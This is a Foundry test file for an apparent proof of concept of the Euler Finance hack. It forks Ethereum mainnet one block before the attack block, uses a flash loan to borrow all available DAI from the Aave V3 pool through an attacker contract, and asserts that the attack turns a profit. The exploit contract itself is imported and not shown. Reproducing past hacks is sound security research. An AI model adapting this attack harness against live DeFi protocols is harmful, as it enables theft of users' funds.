// SPDX-License-Identifier: UNLICENSED
pragma experimental ABIEncoderV2;
pragma solidity ^0.8.4;

import {Test, console2} from "forge-std/Test.sol";
import {EulerHackPoC} from "../src/EulerHackPoC.sol";
import {IPoolAddressesProvider} from "@aave/v3/interfaces/IPoolAddressesProvider.sol";
import {IPool} from "@aave/v3/interfaces/IPool.sol";
import {IAToken} from "@aave/v3/interfaces/IAToken.sol";
import {IPriceOracle} from "@aave/v3/interfaces/IPriceOracle.sol";
import {DataTypes} from "@aave/v3/protocol/libraries/types/DataTypes.sol";
import {IERC20} from "@aave/v3/dependencies/openzeppelin/contracts/IERC20.sol";
import {Constants} from "./Constants.sol";

contract EulerHackPoCTest is Test {

    EulerHackPoC public attacker;
    IPool public pool;

    function setUp() public {
        // 1 block before the real attack otherwise the attack will fail
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), Constants.ATTACK_BLOCK_NUMBER - 1);
        IPoolAddressesProvider poolAddressesProvider = IPoolAddressesProvider(Constants.POOL_ADDRESSES_PROVIDER);
        pool = IPool(poolAddressesProvider.getPool());
        attacker = new EulerHackPoC(poolAddressesProvider, Constants.DAI);
    }

    function test_Attack() public {
        // Get the attacker's balance before the attack
        uint256 attackerBalanceBefore = IERC20(Constants.DAI).balanceOf(address(attacker));
        console2.log("Attacker DAI balance before:", attackerBalanceBefore/ 1e18);

        // Get reserve data
        DataTypes.ReserveData memory reserveData = pool.getReserveData(Constants.DAI);

        // Calculate how much we can borrow
        IERC20 stableDebtToken = IERC20(reserveData.stableDebtTokenAddress);
        IERC20 variableDebtToken = IERC20(reserveData.variableDebtTokenAddress);
        uint256 totalLiquidity = IERC20(reserveData.aTokenAddress).totalSupply();
        uint256 availableForBorrowing = totalLiquidity - (variableDebtToken.totalSupply() + stableDebtToken.totalSupply() + reserveData.unbacked + reserveData.accruedToTreasury);

        console2.log("Total amount available for borrowing on the AaveV3 DAI pool", availableForBorrowing / 1e18);

        // Execute the attack
        console2.log("Executing attack");
        attacker.callFashLoan(Constants.DAI, availableForBorrowing);

        // Get the attacker's balance after the attack
        uint256 attackerBalanceAfter = IERC20(Constants.DAI).balanceOf(address(attacker));
        console2.log("Attacker DAI balance after", attackerBalanceAfter / 1e18);

        // Check if the attack was profitable
        assertGt(attackerBalanceAfter, attackerBalanceBefore);
    }
}
